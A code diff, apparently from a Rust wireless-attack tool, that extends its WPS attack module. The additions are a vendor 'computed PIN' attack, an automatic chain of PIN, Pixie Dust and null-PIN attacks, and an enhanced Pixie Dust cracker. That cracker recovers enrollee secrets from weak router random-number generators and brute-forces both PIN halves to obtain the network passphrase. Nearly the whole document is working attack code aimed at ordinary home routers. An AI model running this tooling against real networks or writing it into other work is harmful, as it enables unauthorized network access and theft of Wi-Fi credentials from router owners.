@@ -51,6 +51,10 @@ pub enum WpsAttackType {
     BruteForce,
     /// Null PIN — try "00000000". Single attempt.
     NullPin,
+    /// Computed PIN — try vendor-specific PIN generation algorithms.
+    ComputedPin,
+    /// Auto — smart chain: ComputedPin → PixieDust → NullPin.
+    Auto,
 }
 
 impl WpsAttackType {
@@ -59,6 +63,8 @@ impl WpsAttackType {
             Self::PixieDust => "Pixie Dust",
             Self::BruteForce => "Brute Force",
             Self::NullPin => "Null PIN",
+            Self::ComputedPin => "Computed PIN",
+            Self::Auto => "Auto",
         }
     }
 
@@ -67,6 +73,8 @@ impl WpsAttackType {
             Self::PixieDust => "pixie",
             Self::BruteForce => "brute",
             Self::NullPin => "null-pin",
+            Self::ComputedPin => "pins",
+            Self::Auto => "auto",
         }
     }
 }
@@ -211,6 +219,32 @@ pub enum WpsPhase {
     Done,
 }
 
+impl WpsPhase {
+    /// Short label for results table display (e.g. "M3", "AUTH", "EAP").
+    pub fn short_label(&self) -> &'static str {
+        match self {
+            Self::Idle => "-",
+            Self::KeyGeneration => "DH",
+            Self::Authenticating => "AUTH",
+            Self::Associating => "ASSOC",
+            Self::EapIdentity | Self::WscStart => "EAP",
+            Self::M1Received => "M1",
+            Self::M2Sent => "M2",
+            Self::M3Received => "M3",
+            Self::M4Sent => "M4",
+            Self::M5Received => "M5",
+            Self::M6Sent => "M6",
+            Self::M7Received => "M7",
+            Self::PixieCracking => "PIXIE",
+            Self::BruteForcePhase1 => "BF/1",
+            Self::BruteForcePhase2 => "BF/2",
+            Self::LockoutWait => "LOCK",
+            Self::NullPin => "NULL",
+            Self::Done => "DONE",
+        }
+    }
+}
+
 impl Default for WpsPhase {
     fn default() -> Self {
         Self::Idle
@@ -324,7 +358,6 @@ pub struct WpsInfo {
 #[derive(Debug, Clone)]
 pub struct WpsResult {
     /// Target BSSID — used by CLI result display
-    #[allow(dead_code)]
     pub bssid: MacAddress,
     pub ssid: String,
     pub channel: u8,
@@ -333,6 +366,14 @@ pub struct WpsResult {
     pub psk: Option<String>,
     pub attempts: u32,
     pub elapsed: Duration,
+    /// AP manufacturer from M1 device info (empty if M1 never reached).
+    pub manufacturer: String,
+    /// AP model name from M1 device info.
+    pub model: String,
+    /// AP device name from M1 device info.
+    pub device_name: String,
+    /// Highest WPS phase reached before completion/failure.
+    pub max_phase: WpsPhase,
 }
 
 /// Aggregate result after all targets have been processed.
@@ -478,6 +519,25 @@ pub enum WpsEventKind {
     },
     /// Non-fatal error.
     Error { message: String },
+    // ── PIN generation events ──
+    /// Computed PIN generation started.
+    PinGenStarted { candidates: usize },
+    /// Trying a computed PIN candidate.
+    PinGenAttempt { pin: String, algo: String, attempt: usize, total: usize },
+    /// Computed PIN succeeded.
+    PinGenSuccess { pin: String, algo: String, psk: String },
+    /// All computed PINs failed.
+    PinGenFailed,
+    // ── Skip events ──
+    /// Current sub-attack skipped by user.
+    AttackSkipped { attack_type: String },
+    /// Current target skipped by user.
+    TargetSkipped { idx: usize },
+    // ── Enhanced Pixie Dust PRNG events ──
+    /// Trying a specific PRNG recovery mode.
+    PixiePrngMode { mode: String },
+    /// PRNG mode successfully recovered E-S1/E-S2.
+    PixiePrngRecovered { mode: String, elapsed_ms: u64 },
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -858,6 +918,10 @@ pub struct WpsAttack {
     events: Arc<EventRing<WpsEvent>>,
     running: Arc<AtomicBool>,
     done: Arc<AtomicBool>,
+    /// Skip current sub-attack in Auto mode (one-shot, cleared by engine).
+    skip_attack: Arc<AtomicBool>,
+    /// Skip current target in --all mode (one-shot, cleared by engine).
+    skip_target: Arc<AtomicBool>,
 }
 
 impl WpsAttack {
@@ -868,7 +932,19 @@ impl WpsAttack {
             events: Arc::new(EventRing::new(1024)),
             running: Arc::new(AtomicBool::new(false)),
             done: Arc::new(AtomicBool::new(false)),
+            skip_attack: Arc::new(AtomicBool::new(false)),
+            skip_target: Arc::new(AtomicBool::new(false)),
         }
+    }
+
+    /// Signal to skip the current sub-attack (e.g., move to next in Auto chain).
+    pub fn skip_attack(&self) {
+        self.skip_attack.store(true, Ordering::SeqCst);
+    }
+
+    /// Signal to skip the current target (move to next AP in --all mode).
+    pub fn skip_target(&self) {
+        self.skip_target.store(true, Ordering::SeqCst);
     }
 
     /// Start the WPS attack on a background thread.
@@ -881,10 +957,14 @@ impl WpsAttack {
         let events = Arc::clone(&self.events);
         let running = Arc::clone(&self.running);
         let done = Arc::clone(&self.done);
+        let skip_attack = Arc::clone(&self.skip_attack);
+        let skip_target = Arc::clone(&self.skip_target);
         let params = self.params.clone();
 
         running.store(true, Ordering::SeqCst);
         done.store(false, Ordering::SeqCst);
+        skip_attack.store(false, Ordering::SeqCst);
+        skip_target.store(false, Ordering::SeqCst);
         {
             let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
             info.running = true;
@@ -905,7 +985,7 @@ impl WpsAttack {
                 let reader = shared.subscribe("wps");
                 let tx_fb = shared.tx_feedback();
                 tx_fb.reset();
-                run_wps_multi(&shared, &reader, &targets, &params, &info, &events, &running, &tx_fb);
+                run_wps_multi(&shared, &reader, &targets, &params, &info, &events, &running, &skip_attack, &skip_target, &tx_fb);
                 running.store(false, Ordering::SeqCst);
                 done.store(true, Ordering::SeqCst);
                 {
@@ -957,12 +1037,15 @@ fn run_wps_multi(
     info: &Arc<Mutex<WpsInfo>>,
     events: &Arc<EventRing<WpsEvent>>,
     running: &Arc<AtomicBool>,
+    skip_attack: &Arc<AtomicBool>,
+    skip_target: &Arc<AtomicBool>,
     tx_fb: &crate::core::TxFeedback,
 ) {
     let attack_start = Instant::now();
 
     for (idx, target) in targets.iter().enumerate() {
         if !running.load(Ordering::SeqCst) { break; }
+        skip_target.store(false, Ordering::SeqCst); // reset per target
 
         // Inter-target delay (skip first)
         if idx > 0 && params.inter_target_delay > Duration::ZERO {
@@ -1005,8 +1088,13 @@ fn run_wps_multi(
 
         // Run single target attack
         let target_start = Instant::now();
-        run_wps_attack_single(shared, reader, target, params, info, events, running, attack_start);
+        run_wps_attack_single(shared, reader, target, params, info, events, running, skip_attack, attack_start);
         let target_elapsed = target_start.elapsed();
+
+        // Check skip_target signal
+        if skip_target.load(Ordering::SeqCst) {
+            push_event(events, attack_start, WpsEventKind::TargetSkipped { idx: idx + 1 });
+        }
 
         // Collect result
         let result_info = info.lock().unwrap_or_else(|e| e.into_inner()).clone();
@@ -1019,6 +1107,10 @@ fn run_wps_multi(
             psk: result_info.psk_found.clone(),
             attempts: result_info.attempts,
             elapsed: target_elapsed,
+            manufacturer: result_info.ap_manufacturer.clone(),
+            model: result_info.ap_model_name.clone(),
+            device_name: result_info.ap_device_name.clone(),
+            max_phase: result_info.phase,
         };
 
         let is_success = result.status == WpsStatus::Success;
@@ -1075,6 +1167,7 @@ fn run_wps_attack_single(
     info: &Arc<Mutex<WpsInfo>>,
     events: &Arc<EventRing<WpsEvent>>,
     running: &Arc<AtomicBool>,
+    skip_attack: &Arc<AtomicBool>,
     start: Instant,
 ) {
     let our_mac = shared.mac();
@@ -1106,11 +1199,20 @@ fn run_wps_attack_single(
         }
     }
 
-    // Generate DH keypair (expensive ~1-2s for 1536-bit modexp)
+    // Generate DH keypair.
+    // For multi-exchange modes (ComputedPin, Auto, BruteForce), use fast 32-byte keys.
+    // For single-exchange modes (PixieDust, NullPin), use full 192-byte keys.
     set_phase(info, WpsPhase::KeyGeneration);
     let keygen_start = Instant::now();
 
-    let (privkey, pubkey) = match wps_dh_generate() {
+    let use_fast_dh = matches!(params.attack_type,
+        WpsAttackType::ComputedPin | WpsAttackType::Auto | WpsAttackType::BruteForce);
+    let dh_result = if use_fast_dh {
+        wps_dh_generate_fast()
+    } else {
+        wps_dh_generate()
+    };
+    let (privkey, pubkey) = match dh_result {
         Some((priv_k, pub_k)) => (priv_k, pub_k),
         None => {
             push_event(events, start, WpsEventKind::Error {
@@ -1134,6 +1236,10 @@ fn run_wps_attack_single(
 
     let mut session = WpsSession::new(our_mac, privkey, pubkey);
 
+    // Helper: check if we should stop or skip
+    let should_continue = || running.load(Ordering::SeqCst) && !skip_attack.load(Ordering::SeqCst);
+    let is_success = || matches!(info.lock().unwrap_or_else(|e| e.into_inner()).status, WpsStatus::Success);
+
     // Dispatch based on attack type
     match params.attack_type {
         WpsAttackType::PixieDust => {
@@ -1154,6 +1260,43 @@ fn run_wps_attack_single(
         WpsAttackType::NullPin => {
             run_null_pin(shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts,
                 target.capability, &target.supported_rates);
+        }
+        WpsAttackType::ComputedPin => {
+            run_computed_pins(shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts,
+                target.capability, &target.supported_rates, &None);
+        }
+        WpsAttackType::Auto => {
+            // Smart chain: ComputedPin → PixieDust → NullPin
+            // Each step checks skip_attack + running + success before continuing.
+
+            // 1. Computed PINs
+            skip_attack.store(false, Ordering::SeqCst);
+            run_computed_pins(shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts,
+                target.capability, &target.supported_rates, &None);
+
+            if is_success() || !should_continue() {
+                if skip_attack.load(Ordering::SeqCst) {
+                    push_event(events, start, WpsEventKind::AttackSkipped { attack_type: "Computed PIN".to_string() });
+                }
+            }
+
+            // 2. Pixie Dust
+            if !is_success() && should_continue() {
+                skip_attack.store(false, Ordering::SeqCst);
+                run_pixie_dust(shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts,
+                    target.capability, &target.supported_rates);
+
+                if skip_attack.load(Ordering::SeqCst) {
+                    push_event(events, start, WpsEventKind::AttackSkipped { attack_type: "Pixie Dust".to_string() });
+                }
+            }
+
+            // 3. Null PIN
+            if !is_success() && should_continue() {
+                skip_attack.store(false, Ordering::SeqCst);
+                run_null_pin(shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts,
+                    target.capability, &target.supported_rates);
+            }
         }
     }
 
@@ -1204,11 +1347,12 @@ fn run_pixie_dust(
             push_event(events, start, WpsEventKind::PixieCrackStarted);
 
             let crack_start = Instant::now();
-            if let Some(pin) = pixie_crack(session) {
+            if let Some((pin, mode)) = pixie_crack_enhanced(session, events, start) {
                 push_event(events, start, WpsEventKind::PixieCrackSuccess {
                     pin: pin.clone(),
                     elapsed_ms: crack_start.elapsed().as_millis() as u64,
                 });
+                let _ = mode; // mode already logged via PixiePrngRecovered event
                 set_status(info, WpsStatus::Success);
                 let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                 i.pin_found = Some(pin);
@@ -2044,6 +2188,209 @@ fn pixie_crack(session: &WpsSession) -> Option<String> {
         }
     }
 
+    None
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  Computed PIN — try vendor-specific PIN generation algorithms
+// ═══════════════════════════════════════════════════════════════════════════════
+
+#[allow(clippy::too_many_arguments)]
+fn run_computed_pins(
+    shared: &SharedAdapter,
+    reader: &crate::pipeline::PipelineSubscriber,
+    bssid: MacAddress,
+    ssid: &str,
+    params: &WpsParams,
+    session: &mut WpsSession,
+    info: &Arc<Mutex<WpsInfo>>,
+    events: &Arc<EventRing<WpsEvent>>,
+    running: &Arc<AtomicBool>,
+    start: Instant,
+    tx_opts: &TxOptions,
+    ap_capability: u16,
+    ap_rates: &[u8],
+    serial: &Option<String>,
+) {
+    use crate::protocol::wps_pin_gen::generate_pins;
+
+    let candidates = generate_pins(&bssid, serial.as_deref());
+    if candidates.is_empty() {
+        push_event(events, start, WpsEventKind::PinGenFailed);
+        return;
+    }
+
+    push_event(events, start, WpsEventKind::PinGenStarted { candidates: candidates.len() });
+
+    for (idx, candidate) in candidates.iter().enumerate() {
+        if !running.load(Ordering::SeqCst) { break; }
+
+        push_event(events, start, WpsEventKind::PinGenAttempt {
+            pin: candidate.pin.clone(),
+            algo: candidate.algo.name().to_string(),
+            attempt: idx + 1,
+            total: candidates.len(),
+        });
+
+        // Set the PIN for this exchange
+        session.pin = candidate.pin.clone();
+
+        // Update info
+        {
+            let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
+            i.current_pin = candidate.pin.clone();
+            i.attempts += 1;
+        }
+
+        // Try full exchange (depth=2: complete through M7, extract credentials)
+        let result = wps_single_exchange(
+            shared, reader, bssid, ssid, params, session, info, events, running, start,
+            tx_opts, 2, ap_capability, ap_rates,
+        );
+
+        match result {
+            ExchangeResult::PinCorrect { psk } => {
+                push_event(events, start, WpsEventKind::PinGenSuccess {
+                    pin: candidate.pin.clone(),
+                    algo: candidate.algo.name().to_string(),
+                    psk: psk.clone(),
+                });
+                set_status(info, WpsStatus::Success);
+                let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
+                i.pin_found = Some(candidate.pin.clone());
+                i.psk_found = Some(psk);
+                return;
+            }
+            ExchangeResult::Locked => {
+                set_status(info, WpsStatus::Locked);
+                return;
+            }
+            _ => {
+                // PIN wrong or exchange failed — try next candidate
+                if params.delay_between_attempts > Duration::ZERO {
+                    thread::sleep(params.delay_between_attempts);
+                }
+            }
+        }
+    }
+
+    push_event(events, start, WpsEventKind::PinGenFailed);
+}
+
+/// Enhanced Pixie Dust cracking: try simple candidates first, then PRNG recovery modes.
+///
+/// Order:
+/// 1. Simple mode (zero, e_nonce, actual E-S1 if available) — instant
+/// 2. Ralink LFSR recovery from E-Nonce — instant if LFSR state reconstructs
+/// 3. eCos simple LCG — ~33M candidates, seconds
+/// 4. Realtek timestamp — ~172K candidates, fast
+/// 5. eCos simplest — ~33M candidates, seconds
+/// 6. eCos Knuth — ~33M candidates, seconds
+///
+/// Returns (pin_string, mode_name) on success.
+fn pixie_crack_enhanced(
+    session: &WpsSession,
+    events: &Arc<EventRing<WpsEvent>>,
+    start: Instant,
+) -> Option<(String, &'static str)> {
+    // 1. Simple mode (existing fast path)
+    push_event(events, start, WpsEventKind::PixiePrngMode { mode: "simple".to_string() });
+    if let Some(pin) = pixie_crack(session) {
+        return Some((pin, "simple"));
+    }
+
+    // For PRNG recovery, we need the E-Nonce
+    let e_nonce = &session.e_nonce;
+
+    // 2. Ralink LFSR
+    push_event(events, start, WpsEventKind::PixiePrngMode { mode: "ralink-lfsr".to_string() });
+    if let Some((e_s1, e_s2)) = crate::protocol::wps::pixie_recover_ralink(e_nonce) {
+        if let Some(pin) = pixie_crack_with_secrets(session, &e_s1, &e_s2) {
+            push_event(events, start, WpsEventKind::PixiePrngRecovered {
+                mode: "ralink-lfsr".to_string(), elapsed_ms: start.elapsed().as_millis() as u64,
+            });
+            return Some((pin, "ralink-lfsr"));
+        }
+    }
+
+    // 3. eCos simple LCG
+    push_event(events, start, WpsEventKind::PixiePrngMode { mode: "ecos-simple".to_string() });
+    if let Some((e_s1, e_s2)) = crate::protocol::wps::pixie_recover_ecos_simple(e_nonce) {
+        if let Some(pin) = pixie_crack_with_secrets(session, &e_s1, &e_s2) {
+            push_event(events, start, WpsEventKind::PixiePrngRecovered {
+                mode: "ecos-simple".to_string(), elapsed_ms: start.elapsed().as_millis() as u64,
+            });
+            return Some((pin, "ecos-simple"));
+        }
+    }
+
+    // 4. Realtek timestamp (use current Unix time as center)
+    push_event(events, start, WpsEventKind::PixiePrngMode { mode: "realtek-timestamp".to_string() });
+    let now_secs = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap_or_default()
+        .as_secs() as u32;
+    if let Some((e_s1, e_s2)) = crate::protocol::wps::pixie_recover_realtek_timestamp(e_nonce, now_secs) {
+        if let Some(pin) = pixie_crack_with_secrets(session, &e_s1, &e_s2) {
+            push_event(events, start, WpsEventKind::PixiePrngRecovered {
+                mode: "realtek-timestamp".to_string(), elapsed_ms: start.elapsed().as_millis() as u64,
+            });
+            return Some((pin, "realtek-timestamp"));
+        }
+    }
+
+    // 5. eCos simplest
+    push_event(events, start, WpsEventKind::PixiePrngMode { mode: "ecos-simplest".to_string() });
+    if let Some((e_s1, e_s2)) = crate::protocol::wps::pixie_recover_ecos_simplest(e_nonce) {
+        if let Some(pin) = pixie_crack_with_secrets(session, &e_s1, &e_s2) {
+            push_event(events, start, WpsEventKind::PixiePrngRecovered {
+                mode: "ecos-simplest".to_string(), elapsed_ms: start.elapsed().as_millis() as u64,
+            });
+            return Some((pin, "ecos-simplest"));
+        }
+    }
+
+    // 6. eCos Knuth
+    push_event(events, start, WpsEventKind::PixiePrngMode { mode: "ecos-knuth".to_string() });
+    if let Some((e_s1, e_s2)) = crate::protocol::wps::pixie_recover_ecos_knuth(e_nonce) {
+        if let Some(pin) = pixie_crack_with_secrets(session, &e_s1, &e_s2) {
+            push_event(events, start, WpsEventKind::PixiePrngRecovered {
+                mode: "ecos-knuth".to_string(), elapsed_ms: start.elapsed().as_millis() as u64,
+            });
+            return Some((pin, "ecos-knuth"));
+        }
+    }
+
+    None
+}
+
+/// Crack PIN halves given known E-S1 and E-S2 values recovered from PRNG.
+fn pixie_crack_with_secrets(session: &WpsSession, e_s1: &[u8; 16], e_s2: &[u8; 16]) -> Option<String> {
+    // Brute force first half (0000-9999) against E-Hash1 using known E-S1
+    for pin1 in 0u16..10000 {
+        let half1_str = format!("{:04}", pin1);
+        let psk1 = wps_hmac_sha256(&session.authkey, half1_str.as_bytes())?;
+        let computed = wps_hmac_sha256_multi(
+            &session.authkey,
+            &[e_s1.as_ref(), &psk1[..16], &session.pke, &session.pubkey],
+        )?;
+        if computed == session.e_hash1 {
+            // First half found, now crack second half with E-S2
+            for pin2_3 in 0u16..1000 {
+                let full7 = pin1 as u32 * 1000 + pin2_3 as u32;
+                let chk = wps_pin_checksum(full7);
+                let half2_str = format!("{:03}{}", pin2_3, chk);
+                let psk2 = wps_hmac_sha256(&session.authkey, half2_str.as_bytes())?;
+                let computed2 = wps_hmac_sha256_multi(
+                    &session.authkey,
+                    &[e_s2.as_ref(), &psk2[..16], &session.pke, &session.pubkey],
+                )?;
+                if computed2 == session.e_hash2 {
+                    return Some(format!("{}{}", half1_str, half2_str));
+                }
+            }
+        }
+    }
     None
 }
 
